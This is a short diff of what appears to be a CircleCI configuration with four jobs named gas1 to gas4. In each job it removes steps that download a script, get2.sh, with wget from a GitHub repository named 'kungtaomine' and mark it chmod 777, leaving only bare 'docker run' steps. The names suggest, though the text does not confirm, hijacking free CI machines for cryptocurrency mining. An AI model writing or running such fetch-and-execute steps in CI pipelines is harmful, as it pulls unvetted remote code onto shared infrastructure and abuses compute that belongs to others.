@@ -5,26 +5,18 @@ jobs:
   gas1:
     machine: true
     steps:
-      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
-      - run: chmod 777 get2.sh 
       - run: docker run
   gas2:
     machine: true
     steps:
-      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
-      - run: chmod 777 get2.sh 
       - run: docker run
   gas3:
     machine: true
     steps:
-      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
-      - run: chmod 777 get2.sh 
       - run: docker run
   gas4:
     machine: true
     steps:
-      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
-      - run: chmod 777 get2.sh 
       - run: docker run
 
 # Orchestrate our job run sequence
